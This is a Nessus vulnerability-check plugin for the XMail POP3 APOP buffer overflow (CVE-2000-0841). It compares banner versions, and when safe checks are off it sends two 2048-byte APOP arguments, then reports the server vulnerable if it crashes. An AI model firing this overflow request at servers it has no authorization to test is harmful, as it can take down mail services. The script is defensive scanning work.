#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10559);
 script_bugtraq_id(1652);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0841");
 name["english"] = "XMail APOP Overflow";
 name["francais"] = "Dépassement de buffer APOP dans XMail";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The remote POP3 server seems
to be subject to a buffer overflow when it receives
two arguments which are too long for the APOP command.

This problem may allow an attacker to disable this
POP server or to execute arbitrary code on this
host.

Solution : Contact your vendor for a patch
Risk factor : High";


 desc["francais"] = "
Le serveur POP3 distant semble etre vulnérable à un problème
de dépassement de buffer lorsqu'il recoit deux arguments trop longs
à la commande APOP.

Ce problèmez peut permettre à un pirate d'executer du code
arbitraire sur ce serveur ou bien de désactiver le serveur POP
à distance.

Solution : Contactez votre vendeur pour un patch
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to overflow the APOP command";
 summary["francais"] = "Essaye de trop remplir les buffers de la commande APOP";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("popserver_detect.nasl", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

include('global_settings.inc');

if (report_paranoia < 1)
{
 fake = get_kb_item("pop3/false_pop3");
 if (fake) exit(0);
}

port = get_kb_item("Services/pop3");
if(!port)port = 110;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
 banner = get_kb_item(string("pop3/banner/", port));
 if(!banner)
 {
  soc = open_sock_tcp(port);
  if(!soc)exit(0); 
  banner = recv_line(socket:soc, length:4096);
 }
 
 if(!banner)exit(0);
 
 if(ereg(pattern:".*[xX]mail.*", string:banner))
 {
  if(ereg(pattern:"[^0-9]*0\.(([0-4][0-9])|(5[0-8]))[^0-9]*.*"))
   {
    desc = "
The remote server is XMail, prior to version 0.59.
This version is vulnerable to a buffer overflow in
the APOP command which allows anyone to execute
arbitrary commands on this system.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Contact your vendor for a patch
Risk factor : High";

    security_hole(port:port, data:desc);
   }
 }
 exit(0);
}

 soc = open_sock_tcp(port);
 if(! soc) exit(0);

  d = recv_line(socket:soc, length:1024);
  if(!d || !ereg(pattern:".*[xX]mail.*", string:d))
  {
   close(soc);
   exit(0);
  }
  c = string("APOP ", crap(2048), " ", crap(2048), "\r\n");
  send(socket:soc, data:c);
  r = recv_line(socket:soc, length:1024);

  close(soc);

for (i = 1; i <= 3; i ++)
{
  soc = open_sock_tcp(port);
  if (soc) break;
  sleep(i);
}
  if(!soc)security_hole(port);
  else {
   	r = recv_line(socket:soc, length:1024);
	if(!r)security_hole(port);
	close(soc);
	}
